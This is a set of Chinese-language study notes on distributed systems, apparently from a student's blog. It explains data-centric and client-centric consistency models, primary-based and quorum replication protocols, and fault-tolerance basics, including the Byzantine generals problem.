<h3 id="两个术语𝑊𝑖-𝑥-𝑎和𝑅𝑖-𝑥-𝑏"><a href="#两个术语𝑊𝑖-𝑥-𝑎和𝑅𝑖-𝑥-𝑏" class="headerlink" title="两个术语𝑊𝑖(𝑥)𝑎和𝑅𝑖(𝑥)𝑏"></a>两个术语𝑊𝑖(𝑥)𝑎和𝑅𝑖(𝑥)𝑏</h3><ul>
<li>𝑊𝑖(𝑥)𝑎: 进程𝑃𝑖把数值a写入到数据项x。</li>
<li>𝑅𝑖(𝑥)𝑏: 进程𝑃𝑖从数据项x读取数据后返回数值b。</li>
</ul>
<h3 id="严格一致性"><a href="#严格一致性" class="headerlink" title="严格一致性"></a>严格一致性</h3><p><strong>就是写操作必须在读操作的前面执行</strong></p>
<p><strong>定义:</strong></p>
<p>在一个副本上执行更新操作时，无论这一操作是在哪个副本上启动或执行的，这一更新操作都应该在后序操作发生前传播到所有副本。</p>
<p>从这个定义里可以发现：</p>
<ul>
<li>隐含的假设存在绝对的全局时间。</li>
<li>在单处理器中(或者在有单一控制总线环境下-&gt;单一时钟)可以实现，在分布式系统中<strong>不可能</strong>实现。</li>
</ul>
<p><strong>例:</strong> 下图中，(a)是具有严格一致性的，(b)是没有的，因为P2出现了R(x)NIL，P1的写操作没有在P2的读操作之前传播过来。 (这根线的意思就是❌，表示这个图不满足要求)</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451803.png" alt="image-20190419143114051"></p>
<h2 id="以数据为中心的一致性模型"><a href="#以数据为中心的一致性模型" class="headerlink" title="以数据为中心的一致性模型"></a>以数据为中心的一致性模型</h2><p><strong>要求知道定义，能判断！</strong></p>
<h3 id="持续一致性"><a href="#持续一致性" class="headerlink" title="持续一致性"></a>持续一致性</h3><p>这块老师大概提了一下，大概意思是什么是一致，怎么判断一致，以一个什么样的标准来判断一致。</p>
<h3 id="以数据为中心的一致性模型和以客户为中心的一致性模型的区别"><a href="#以数据为中心的一致性模型和以客户为中心的一致性模型的区别" class="headerlink" title="以数据为中心的一致性模型和以客户为中心的一致性模型的区别"></a>以数据为中心的一致性模型和以客户为中心的一致性模型的区别</h3><h4 id="以数据为中心的一致性模型-1"><a href="#以数据为中心的一致性模型-1" class="headerlink" title="以数据为中心的一致性模型"></a>以数据为中心的一致性模型</h4><p>不区分客户，所以叫以数据为中心的一致性模型。</p>
<ol>
<li><strong>针对所有的用户，是没有区别的。所有用户看到的都是同样的东西。对所有的用户一视同仁。</strong></li>
<li>以数据为中心的一致性模型，从大的范围来看，<strong>都是比较严格的一致性模型。</strong></li>
<li><strong>成本比较高。</strong></li>
<li>常常用在大型的数据中心中，系统一般来讲不是很大，<strong>以局域网为主。</strong></li>
</ol>
<h4 id="以用户为中心的一致性模型"><a href="#以用户为中心的一致性模型" class="headerlink" title="以用户为中心的一致性模型"></a>以用户为中心的一致性模型</h4><ol>
<li><strong>用户不同，看到的结果可能不一样。</strong></li>
<li>以客户为中心的一致性模型，<strong>都是比较弱的一致性。</strong></li>
<li>因为是针对某一个客户的需求来保持一致。<strong>相对来说成本比较低。</strong></li>
<li>范围广，甚至可以在Internet上使用，相对来说是在一个广域网上，<strong>一般用在企业应用上。</strong></li>
</ol>
<p><strong>后面的一系列模型，就是在对严格一致性的条件进行放松，在一个双方都可以接受的约束，认为它是一致的 (类似于睁一只眼闭一只眼)</strong></p>
<h3 id="顺序一致性"><a href="#顺序一致性" class="headerlink" title="顺序一致性"></a>顺序一致性</h3><p><strong>定义</strong></p>
<p>数据存储满足以下条件时，称为是顺序一致的。</p>
<blockquote>
<p>任何进程的执行结果都是相同的，就好像所有进程对数据存储的读、写操作是<strong>按某种序列顺序</strong>执行的，并且每个进程的操作按照程序所制定的顺序出现在这个序列中。</p>
</blockquote>
<p><strong>和严格一致不同之处</strong></p>
<p>不再要求写必须在读的前面。</p>
<p><strong>思想</strong></p>
<p>允许由于种种因素出错，但是出的错得是一样的，所有人最后结果相同就行。</p>
<p><strong>例：</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451804.png" alt="image-20190419151031060"></p>
<p>左边这个图（先不看红色的字）是满足<strong>顺序一致性</strong>的。P1的写a操作由于网络延迟等因素，在P2的写b操作之后发生，所以P3和P4都是先读到b，再读到a。如果要满足严格一致性的话（看红色字），那么在P2写b操作之后，所有进程应该只能读出b来，这才满足严格一致性。</p>
<p>右边的图不满足顺序一致性，P3先读到了b再读到a，P4先读到a再读到b。进程对数据存储的读写没有按某种序列顺序进行。</p>
<p><strong>顺序一致性也是比较难做出来的。但是是一个强一致性，顺序一致性做到了 100%的分布式透明性。</strong></p>
<h3 id="因果一致性"><a href="#因果一致性" class="headerlink" title="因果一致性"></a>因果一致性</h3><p><strong>基本思想</strong></p>
<p>满足因果条件下，所有人必须是一致的，不满足因果条件可以不一致。</p>
<p>从数据的产生和消费的角度去定义因果。数据总是产生在前，消费在后。</p>
<p><strong>因果性</strong></p>
<p>如果事件B是由事件A引起的，或受到事件A的影响，那么因果关系必然要求其他每个人先看到事件A再看到事件B。</p>
<p>考虑一个分布式数据库的示例：</p>
<p>假设进程P1对数据项x执行了写操作。然后进程P2先读取x，然后对y执行写操作。这里，对x的读操作和对y的写操作具有潜在的因果关系，因为y的计算可能依赖于P2所读取的x的值(也即，P1写入的值)。</p>
<p><strong>潜在因果关系</strong></p>
<ol>
<li><strong>同一进程，先读再写有因果关系。</strong>很可能是读取了这个数据才能执行操作，然后写入结果。</li>
<li><strong>不同进程，先写再读有因果关系。</strong>不同的进程间，一个把结果写进去，另一个才能够读出来。</li>
<li>两个读之间没有因果关系。</li>
<li>两个写之间没有因果关系。</li>
<li>因果关系具有传递性，e.g. If write1-&gt; read, and read -&gt; write2, then write1 -&gt; write2.</li>
</ol>
<p><strong>定义</strong></p>
<p>如果数据库是因果一致的，那么它必须服从以下条件：</p>
<blockquote>
<p>所有进程必须以相同的顺序看到具有<strong>潜在因果关系</strong>的写操作。</p>
<p>不同进程上可以以不同的顺序看到并发的写操作。</p>
</blockquote>
<p>我看到这个定义也是一脸懵逼，看几个例子就懂了。</p>
<p><strong>例子1</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451805.png" alt="image-20190419153834211"></p>
<p>由潜在因果关系第二条，P1和P2之间，先发生𝑊1(𝑥)𝑎，再发生𝑅2(𝑥)𝑎，先写再读，具有潜在因果关系，所以读出来的结果必须是一致的，所有进程都必须读出a。这就是定义第一句话的意思。</p>
<p>由潜在因果关系第四条，两个写之间没有因果关系，所以𝑊2(𝑥)𝑏和𝑊1(𝑥)𝑐没有因果关系，那么读出什么结果都满足因果一致性，这就是定义第二句话的意思。但是这里不满足严格一致性和顺序一致性。</p>
<p>因果关系具有传递性，在P2内部发生了先读再写，由潜在因果关系第二条，满足因果关系，再由因果关系的传递性可知，𝑊1(𝑥)𝑎与𝑊2(𝑥)𝑏构成因果关系。图上原谅色箭头所示。</p>
<p><strong>例子2：</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451806.png" alt="image-20190419155014568"></p>
<p>刚刚才提到的，由因果关系的传递性可知，𝑊1(𝑥)𝑎与𝑊2(𝑥)𝑏构成因果关系，所以后面所有进程读出来的结果都必须一致，但是这里不一致，所以不满足因果一致性。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451807.png" alt="image-20190419155138555"></p>
<p>这个就满足了，因为两个并发写没有因果关系。</p>
<p><strong>应用</strong></p>
<p>因果一致性是首先应用在大量集群中的一致性模型。</p>
<p><strong>实现方式：</strong></p>
<ul>
<li>向量时钟：使用向量时间戳捕获因果关系</li>
</ul>
<h3 id="分组操作"><a href="#分组操作" class="headerlink" title="分组操作"></a>分组操作</h3><p>分组操作是一个弱一致性模型。实质是依靠<strong>加锁（这个锁就是同步化变量）</strong>，将一些非原子操作组合为原子操作，从而实现弱一致性。</p>
<p>由于引入了锁的概念，分布式系统就变得不是那么透明了。</p>
<p><strong>分组操作需要满足以下标准:</strong></p>
<blockquote>
<ol>
<li>在一个进程对被保护的共享数据的所有更新操作执行完之前，不允许另一个进程执行对同步化变量的获取访问。</li>
<li>如果一个进程对某个同步化变量正进行互斥模式访问，那么其他进程就不能拥有该同步化变量，即使是非互斥模式也不行。</li>
<li>某个进程对某个同步化变量的互斥模式访问完成后，除非该变量的拥有者执行完操作，否则任何其他进程对该变量的下一个非互斥模式访问也是不允许的。</li>
</ol>
</blockquote>
<p><strong>解析：</strong></p>
<ol>
<li>第一个条件表示，当一个进程获得拥有权后，这种拥有权直到所有被保护的数据都已更新为止。换句话说，对被保护数据的所有远程修改都是可见的。 (这个远程修改又是个啥？？？)</li>
<li>第二个条件表示，在更新一个共享数据项之前，进程必须以互斥模式进入临界区，以确保不会有其他进程试图同时更新该共享数据。</li>
<li>如果一个进程要以非互斥模式进入临界区，必须首先与该同步化变量的拥有者进行协商，确保临界区获得了访问被保护共享数据的最新副本。</li>
</ol>
<p>我感觉上面废话了这么多，就是想说：</p>
<ol>
<li>一个进程获得一个数据的控制权后，其他进程不能再获得这个数据的控制权；</li>
<li>一个进程在修改一个数据时，必须以互斥模式进入临界区；</li>
<li>进程以非互斥模式进入临界区，要先获得共享数据的最新副本。</li>
</ol>
<p><strong>例：入口一致性问题</strong></p>
<p>入口一致性的编程问题: 正确地把数据与同步化变量相关联</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451808.png" alt="image-20190419175505219"></p>
<ol>
<li>P1获得了x的同步变量，修改x一次，然后再获得y的同步变量，修改y，然后释放x的同步变量，再释放y的同步变量。</li>
<li>进程P2获得了x的同步变量，但是没有获得y，因此他可以从x读取值a，但如果读取y则为NIL，因为进程P3首先获得了y的同步变量，所以当P1释放y的同步变量时，P3可以读得值b。</li>
</ol>
<h3 id="Weak-consistency-properties"><a href="#Weak-consistency-properties" class="headerlink" title="Weak consistency properties"></a>Weak consistency properties</h3><ul>
<li>Accesses to <em>synchronization</em> <em>variables</em> associated with a data store are sequentially consistent.</li>
<li>No operation on a synchronization variable is allowed to be performed until <em>all</em> <em>previous writes have been completed</em> everywhere.</li>
<li>No read or write operation on data items are allowed to be performed until <em>all previous operations to synchronization variables have been performed</em>.</li>
</ul>
<p>例：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451809.png" alt="image-20190419180527374"></p>
<ol>
<li>S表示同步，由于P2，P3没有进行S操作，所以是不保证读取结果一样的。</li>
<li>对于第二个(b)，P1进行了S操作，P2也在R之前进行了S操作，P2应该读取R(x)b。所以(b)这个例子是不满足弱一致性模型的。如果S在R后面，则不违反弱一致性模型。</li>
</ol>
<h2 id="以客户为中心的一致性模型"><a href="#以客户为中心的一致性模型" class="headerlink" title="以客户为中心的一致性模型"></a>以客户为中心的一致性模型</h2><p>以客户为中心的一致性模型，底层上是<strong>更新的传播</strong>。</p>
<h3 id="最终一致性-x2F-事件一致性"><a href="#最终一致性-x2F-事件一致性" class="headerlink" title="最终一致性&#x2F;事件一致性"></a>最终一致性&#x2F;事件一致性</h3><blockquote>
<p>没有更新操作时，所有副本逐渐成为相互完全相同的副本。</p>
</blockquote>
<p><strong>最终一致性实际上只要求更新操作被保证传播到所有副本。</strong></p>
<p>常用在广域网，分布式数据库上。</p>
<h3 id="符号说明"><a href="#符号说明" class="headerlink" title="符号说明"></a>符号说明</h3><ul>
<li><p>𝑋𝑖[𝑡]: Version of data item <em>x</em> at time <em>t</em> at local copy 𝐿𝑖</p>
<p>t时刻本地副本𝐿𝑖中数据项x的版本</p>
</li>
<li><p>𝑊𝑆(𝑥𝑖[𝑡]): all write operations at 𝐿𝑖 since init</p>
<p>对𝐿𝑖中的x进行一系列写操作得到𝑋𝑖[𝑡]，𝑊𝑆(𝑥𝑖[𝑡])表示这一系列写操作的集合</p>
</li>
<li><p>𝑊𝑆(𝑥𝑖[𝑡1],𝑥𝑗[𝑡2]): If operations in 𝑊𝑆(𝑥𝑖[𝑡1]) have also been performed at local copy 𝐿𝑗 at a later time <em>t</em>2, it is known that 𝑊𝑆(𝑥𝑖[𝑡1]) is part of 𝑊𝑆(𝑥𝑗[𝑡2])</p>
<p>t2时刻， 𝑊𝑆(𝑥𝑖[𝑡1])中的操作也已经在本地副本𝐿𝑖上执行完毕，表示更新传播了，记为 𝑊𝑆(𝑥𝑖[𝑡1],𝑥𝑗[𝑡2])</p>
</li>
</ul>
<h3 id="单调读"><a href="#单调读" class="headerlink" title="单调读"></a>单调读</h3><p><strong>定义</strong></p>
<blockquote>
<p><em>If a process reads the value of a data item x, any successive read operation on x by that process will always return that same or a more recent value.</em></p>
<p>如果一个进程读取数据项x的值，那么该进程对x执行的任何后续读操作将总是得到第一次读取的那个值或更新的值。</p>
</blockquote>
<p><strong>解释</strong></p>
<p>Client “sees” only same or newer version of data.</p>
<p>接下来的读操作要么和之前的读操作值一样，要么值比他还新。</p>
<p><strong>例</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451810.png" alt="image-20190420005037923"></p>
<p>进程先在L1上对x执行了一批写操作，又在L2上再执行一批写操作。</p>
<p>图(a)满足单调读一致性。在执行对L2写x2的时候，会先把在L1上的写操作更新到L2的副本上，即先写入x1，再写入x2。这样，在L2读到x2时，这里面的x2是包含x1写操作的内容的。</p>
<p>而图(b)中就不满足了，直接对L2写x2，那么在后续读到x2的时候，只有WS(x2)的内容，不包含x1带来的内容。</p>
<h3 id="单调写"><a href="#单调写" class="headerlink" title="单调写"></a>单调写</h3><p><strong>定义</strong></p>
<blockquote>
<p><em>A write operation by a process on a data item x is completed before any successive write operation on x by the same process.</em></p>
<p>一个进程对数据项x执行的写操作必须在该进程对x执行任何后续写操作之前完成。</p>
</blockquote>
<p><strong>解释</strong></p>
<p>Write happens on a copy only if it’s brought up to date with preceding write operations on same data (but possibly at different copies).</p>
<p>两个写操作，前面那个写操作写完，后面那个写操作才写</p>
<p>每个写操作完全覆盖<em>x</em>的当前值，但是没有必要更新副本。如果现在副本也要写，必须先完成之前的写操作。</p>
<p><strong>例</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451811.png" alt="image-20190420010641362"></p>
<p>图(a)中，在W(x2)之前，先把W(x1)的操作更新到L2(就是WS(x1))，满足单调写一致性。</p>
<p>图(b)中，b中没有WS(x1)，所以不满足单调写一致性。</p>
<h3 id="读写一致性-read-your-writes"><a href="#读写一致性-read-your-writes" class="headerlink" title="读写一致性 read-your-writes"></a>读写一致性 read-your-writes</h3><p><strong>定义</strong></p>
<blockquote>
<p><em>The effect of a write operation by a process on data item x, will always be seen by a successive read operation on x by the same process.</em></p>
<p>一个进程对数据项x执行一次写操作的结果总是会被该进程对x执行的后续读操作看见。</p>
</blockquote>
<p><strong>解释</strong></p>
<p>All previous writes are always completed before any successive read.</p>
<p>任何读操作发生之前，应该完成全部的写操作。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451812.png" alt="image-20190420011205118"></p>
<p>进程在L1中写了一次x1，在L2中进行读操作，根据读写一致性，此时应该能把在L1中写入的x1读出来。</p>
<p>图(a)中，在R(x2)发生之前，有WS(x1;x2)操作，所以W(x1)在R(x2)之前被传播过来了。</p>
<p>图(b)中，没有把W(x1)的操作更新到L2中，所以R(x2)中没有体现x1的更新，不满足读写一致性。</p>
<h3 id="写读一致性-writes-follow-reads"><a href="#写读一致性-writes-follow-reads" class="headerlink" title="写读一致性 writes-follow-reads"></a>写读一致性 writes-follow-reads</h3><p><strong>定义</strong></p>
<blockquote>
<p><em>A write operation by a process on a data item x following a previous read operation on x by the same process, is guaranteed to take place on the same or a more recent value of x that was read.</em></p>
<p>同一个进程，对数据项x执行的读操作之后的写操作，保证发生在于x读值相同或比值更新的值上。</p>
</blockquote>
<p><strong>解释</strong></p>
<p>Any successive write operation on x will be performed on a copy of x that is same or more recent than the last read.</p>
<p>在x上所有接下来的写操作，应该是从上次读到的地方开始写，或者是比上次读到的结果还要新的地方开始写。</p>
<p><strong>例</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451813.png" alt="image-20190420012142100"></p>
<p>在WS(x2)的时候，要在上次发生读操作R(x1)的地方，或者更新的地方进行写操作，这样需要把WS(x1)传播到L2上。</p>
<p>图(a)中，有WS(x1,x2)，先传播了WS(x1)，再写入了x2，接下来的W(x2)就在正确的地方写入。</p>
<p>但是在b中没有传播WS(x1)，只有WS(x2)，不满足写读一致性。因为后续写操作没有发生在于先前x读取值相同或比之更新的值上。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>官方总结</strong></p>
<p>We can <strong>avoid system-wide consistency</strong>, by concentrating on what specific <strong>clients</strong> want, instead of what should be maintained by servers. Relax consistency requirements even further.</p>
<p>根据客户端的需求来维护内容，进一步放宽了一致性。</p>
<p><strong>个人总结</strong></p>
<p>无论是单调读单调写，还是读写一致写读一致，都是先在一个地方发生写操作，如果以后其他副本发生了其他操作，而先前的写操作没有传播过来，就是不一致的，传播过来就一致。</p>
<h2 id="复制管理"><a href="#复制管理" class="headerlink" title="复制管理"></a>复制管理</h2><h3 id="内容分发"><a href="#内容分发" class="headerlink" title="内容分发"></a>内容分发</h3><p>一个重要的设计问题是将要实际传播哪些信息，分三种:</p>
<ol>
<li>只传播更新的通知</li>
<li>把数据从一个副本传送到另一个副本</li>
<li>把更新操作传播到其他副本</li>
</ol>
<h3 id="拉协议与推协议"><a href="#拉协议与推协议" class="headerlink" title="拉协议与推协议"></a>拉协议与推协议</h3><ol>
<li>基于推式的方法又称为基于服务器的协议，不需要其他副本请求更新，这些更新就被传播到那些副本哪里。</li>
<li>基于拉式的方法，一台服务器或客户请求其他服务器向他发送该服务器此时持有的任何更新，基于拉的协议又称为基于客户的协议</li>
<li>比较:</li>
</ol>
<table>
<thead>
<tr>
<th align="left">Issue</th>
<th align="left">Push-based</th>
<th align="left">Pull-based</th>
</tr>
</thead>
<tbody><tr>
<td align="left">State of server</td>
<td align="left">List of client replicas and caches</td>
<td align="left">None</td>
</tr>
<tr>
<td align="left">Messages sent</td>
<td align="left">Update (and possibly fetch update later)</td>
<td align="left">Poll and update</td>
</tr>
<tr>
<td align="left">Response time at client</td>
<td align="left">Immediate (or fetch-update time)</td>
<td align="left">Fetch-update time</td>
</tr>
</tbody></table>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451814.png" alt="image-20190420013804698"></p>
<h2 id="一致性协议"><a href="#一致性协议" class="headerlink" title="一致性协议"></a>一致性协议</h2><p>讲具体如何实现前面的模型。主要讲Primary-Based Protocols基于主备份的协议和Replicated-Write</p>
<p>Protocols复制的写协议，持续一致性(喝口水)这个不讲了。</p>
<h3 id="Primary-Based-Protocols-基于主备份的协议"><a href="#Primary-Based-Protocols-基于主备份的协议" class="headerlink" title="Primary-Based Protocols 基于主备份的协议"></a>Primary-Based Protocols 基于主备份的协议</h3><p>一个集中式的协议，是主从式的架构。</p>
<h4 id="远程写协议"><a href="#远程写协议" class="headerlink" title="远程写协议"></a>远程写协议</h4><p><strong>原理图</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451815.png" alt="image-20190420013926379"></p>
<p>所有的更新操作全都由primary来完成。当主服务器收到W2的时候，向所有从服务器发送W3，要 对大家一起对，要错大家一起错。</p>
<ul>
<li>这个广播的写操作具有原子性，所以又叫原子多播。</li>
<li>这个不是以数据为中心的一致性模型。比较符合强一致性模型的理念的。</li>
</ul>
<p><strong>潜在的问题</strong></p>
<ol>
<li>发送W1更新请求之后，需要经过W2，原子多播W3，等所有的W4都受到，才返回W5，这 一个过程中，启动更新的进程会被阻塞，要等待很长时间。</li>
<li>另外一种一个非阻塞的方法，就是当前已经更新了x个副本，就返回一个确认消息，然后再通知备份服务器执行这个更新。</li>
<li>牺牲了客户的时间来保证性能。</li>
</ol>
<h4 id="本地写协议"><a href="#本地写协议" class="headerlink" title="本地写协议"></a>本地写协议</h4><p><strong>原理图</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451816.png" alt="image-20190420014332847"></p>
<p>也是基于主备份的协议，当某个进程要更新数据项x是，先定位x的主副本，然后把它移动到当前访问的副本上，客户标记访问的服务器为new primary，之前的是old primary。先给客户做应答， 然后由new告诉各个备份服务器来更新、接受他们发来的更新确认。</p>
<p><strong>潜在的问题</strong></p>
<p>如果客户发起写请求之后，收到确认更新消息了，立即从别的备份服务器再去读，有可能读到一个错误的结果，牺牲了严格的准确性来提升性能。</p>
<h3 id="Replicated-Write-Protocols-复制的写协议"><a href="#Replicated-Write-Protocols-复制的写协议" class="headerlink" title="Replicated-Write Protocols 复制的写协议"></a>Replicated-Write Protocols 复制的写协议</h3><p>一种分布式的解决方案。</p>
<p><strong>规定</strong></p>
<p>一个服务器集群有N个机器，每个机器上都有这个文件。</p>
<p>若要更新这个文件，客户必须先联系至少$\frac{N}{2} + 1$个服务器，并得到他们同意后自行更新。一旦他们更新，该文件将被修改，这个新文件也将与一个新版本号关联，该版本号用于识别文件的版本，对于所有新更新的文件，他们的版本号是相同的。</p>
<p>在读取的时候，有两种版本</p>
<p>a) 联系至少$\frac{N}{2}+1$个服务器，请求他们返回该文件关联的版本号。</p>
<p>b) 根据$N_R$和$N_W$来计算，$N_W$越大，$N_R$就可以越小。(在下面详细说)</p>
<ol>
<li><p>一个客户要读取一个具有N个副本的文件，必须组织一个读团体(read quorum)该读团体是任意$N_R$个以上服务器的集合。</p>
</li>
<li><p>要求改一个文件，客户必须组织一个至少有$N_W$个服务器的写团体。</p>
</li>
<li><p>$N_R$和$N_W$满足以下条件</p>
<ul>
<li>$N_R + N_W &gt; N$：防止读写操作冲突</li>
<li>$N_W &gt; \frac{N}{2}$：防止写写操作冲突</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451817.png" alt="image-20190420020558986"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451818.png" alt="image-20190420020615554"></p>
<p><strong>唉~~一声长叹，复习不易啊。</strong></p>
</li>
</ol>
<p><strong>举例</strong>:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451819.png" alt="image-20190420015837821"></p>
<p>图(a)和(c)是可行的，满足上述两个条件。只要满足$N_R+N_W &gt; N$，那么再怎样都会读到最新版本的文件，根据文件的版本号选择最新的文件即可。</p>
<p>图(b)不行，因为不满足$N_W &gt; \frac{N}{2}$，如果一个进程更新{A, B, C, D, E, F}，令一个进程更新{G, H, I, J, K, L}，这样两边都是最新的版本号，但是文件是内容是不同的，发生写写冲突。</p>
<h3 id="剩下的内容喝了口水，不讲了"><a href="#剩下的内容喝了口水，不讲了" class="headerlink" title="剩下的内容喝了口水，不讲了"></a>剩下的内容喝了口水，不讲了</h3><hr>
<h1 id="Chapter-8-容错-Fault-Tolerance"><a href="#Chapter-8-容错-Fault-Tolerance" class="headerlink" title="Chapter 8 容错 - Fault Tolerance"></a>Chapter 8 容错 - Fault Tolerance</h1><blockquote>
<p><em>“Failure is not an option. It comes bundled with your software.“</em></p>
<p><em>–unknown</em></p>
</blockquote>
<p>出错是一个大概率事件。因此几乎所有的分布式系统都要考虑容错的问题。</p>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ol>
<li><p><strong>Fault tolerance容错</strong></p>
<p>build a component in such a way that it can meet its specifications in the presence of faults (i.e., mask the presence of faults).</p>
<p>构建一个组件，使其能够在出现故障时满足其规范 (即掩盖故障的存在)。</p>
</li>
<li><p><strong>可靠性dependable是一个术语，它包含了分布式系统中很多有用的需求:</strong></p>
<ol>
<li><p><strong>可用性：</strong>被定义为系统的一个属性，他说明系统已准备好，马上可以使用</p>
<p><strong>availability:</strong> Readiness for usage.</p>
</li>
<li><p><strong>可靠性：</strong>指系统可以无故障的持续运行。</p>
<p><strong>Reliability</strong>: Continuity of service delivery.</p>
</li>
<li><p><strong>安全性：</strong>是指系统偶然出现故障的情况下能正确操作而不会造成任何灾难。</p>
<p><strong>Safety:</strong> Low probability of catastrophes.</p>
</li>
<li><p><strong>可维护性：</strong>是指发生故障的系统被恢复难易程度。</p>
<p><strong>Maintainability:</strong> How easy can a failed system be repaired.</p>
</li>
</ol>
</li>
<li><p><strong>Failure:</strong></p>
<p>When a component is not living up to its specifications, a failure occurs.</p>
<p>不满足功能说明，就是failure。</p>
</li>
<li><p><strong>Error:</strong></p>
<p>The part of a component‘s state that can lead to a failure.</p>
<p>一种可能会导致failure的状态</p>
</li>
<li><p><strong>Fault:</strong></p>
<p>The cause of an error.</p>
<p>导致error的原因。</p>
<blockquote>
<p>母鸡公鸡小鸡，都是鸡，不都是鸡吗？在英文中是不同的单词。这说明西方人归纳总结的能力不行。西方人偏向推理，东方人偏向归纳总结。</p>
<p>——丁箐</p>
</blockquote>
</li>
<li><p><strong>Fault的类型</strong></p>
<ol>
<li><p><strong>Transient:</strong> occur once and then disappear.</p>
<p><strong>短暂故障：</strong>只发生一次，然后就消失了，即使重复操作也不会发生。</p>
</li>
<li><p><strong>Intermittent:</strong> occur, then vanish, then reappear.</p>
<p><strong>间歇故障：</strong>发生，消失不见，然后再次发生，如此反复进行。</p>
</li>
<li><p><strong>Permanent:</strong> continues to exist.</p>
<p><strong>持久故障：</strong>是那些知道故障组件被修复之前持续存在的故障</p>
</li>
</ol>
</li>
<li><p><strong>Failure Models</strong></p>
<ol>
<li><p><strong>Crash failures:</strong> A component simply halts, but behaves correctly before halting.</p>
<p><strong>崩溃性故障：</strong>服务器过早的停机，但是在停机之前工作正常。</p>
</li>
<li><p><strong>Omission failures:</strong> A component fails to respond to incoming requests.</p>
<p><strong>Receive omission:</strong> Fails to receive incoming messages.</p>
<p><strong>Send omission:</strong> Fails to send messages.</p>
<p><strong>遗漏性故障：</strong>服务器不能对请求进行响应，分为接受遗漏性故障和发送遗漏性故障。</p>
</li>
<li><p><strong>Timing failures:</strong> The output of a component is correct, but lies outside a specified real-time interval.</p>
<p>E.g., performance failures: too slow.</p>
<p><strong>定时故障：</strong>响应是正确的，但是在指定的时间范围之外，结果是正确的，但是时间不满足要求。</p>
</li>
<li><p><strong>Response failures:</strong> A component’s respond is incorrect.</p>
<p><strong>Value failure:</strong> The wrong value is produced.</p>
<p><strong>State transition failure:</strong> Execution of the component’s service brings it into a wrong state.</p>
<p><strong>响应故障：</strong>服务器响应不正确，分两种，数值故障，状态转换故障。</p>
</li>
<li><p><strong>Arbitrary (byzantine) failures:</strong> A component may produce arbitrary output and be subject to arbitrary timing failures.</p>
<p><strong>随意性故障(也称为拜占庭故障)：</strong>服务器可能产生任意输出并受到任意定时故障的影响，最严重的问题(没错也是Lamport提出来的)</p>
</li>
</ol>
</li>
</ol>
<h2 id="处理容错"><a href="#处理容错" class="headerlink" title="处理容错"></a>处理容错</h2><p>处理容错问题常常使用冗余来解决，例如海明码，物理冗余(多个硬件)。</p>
<h2 id="拜占庭将军问题"><a href="#拜占庭将军问题" class="headerlink" title="拜占庭将军问题"></a>拜占庭将军问题</h2><h3 id="什么是拜占庭将军问题？"><a href="#什么是拜占庭将军问题？" class="headerlink" title="什么是拜占庭将军问题？"></a>什么是拜占庭将军问题？</h3><p>高可靠的分布式系统中需要有较高的容错能力，包括处理其中一部分组件和其他组件返回的消息互相冲突的场景。这个问题可以类比于拜占庭军队围攻一个城池时，各个将军间只能通过信使通信，而将军中可能会有叛徒传递错误的消息。因此需要一种算法能够保证忠诚的将军可以互相达成一致。</p>
<p>假设拜占庭将军们在敌军的周围，将军之间的通信只能通过信使，每个将军根据自己观察的敌情确定下一步的军事行动。将军中可能有背叛者来阻止忠诚的将军达成一致。为了保证下一步军事行动的一致性，将军们需要</p>
<ol>
<li>忠诚的将军最终的决定是一致的。（背叛者可以按照自己的意愿做决定）</li>
<li>少数的背叛者不能导致忠诚的将军做出错误的决定。</li>
</ol>
<p>分布式系统中，没有服务器的存在，所以只能每个节点各自做决定。现在已知网络通讯是可靠的，但是存在不可靠的节点（叛徒）。</p>
<p>需要找到一个算法，每个服务器都使用这个算法来做决策，有叛徒存在的情况下（因为有的节点会出错），至少需要多少个节点，可以做到：</p>
<ol>
<li>所有正常的结点，做出的决定是一致的；</li>
<li>出错的节点不会影响到正常的节点做决定。</li>
</ol>
<p>我只简单写写结论，可以通过Reference的第3个链接点进去详细学习。</p>
<h3 id="投票-Voting"><a href="#投票-Voting" class="headerlink" title="投票 - Voting"></a>投票 - Voting</h3><p>总结点数为n，其中有m个结点出错。</p>
<p>投票需要少数服从多数，所以当$n\ge 2m+1$ 时，能满足要求。</p>
<h3 id="口头消息-Oral-Message"><a href="#口头消息-Oral-Message" class="headerlink" title="口头消息 - Oral Message"></a>口头消息 - Oral Message</h3><p>A给B发送一则口头消息，B仅知道这个消息是A发来的，但是不知道这个消息是A产生的，还是A从别的那里转发来的。</p>
<p><strong>前提条件</strong></p>
<ol>
<li><p>Every message is delivered correctly</p>
<p>消息会被正确地传送。</p>
</li>
<li><p>Receiver knows who sent message</p>
<p>接受者知道此消息谁发的。</p>
</li>
<li><p>Absence of message can be detected</p>
<p>如果有人不发消息，也是可以被检测到的。</p>
</li>
</ol>
<p><strong>结论</strong></p>
<p>当$n\ge 3m + 1$时，能满足要求。</p>
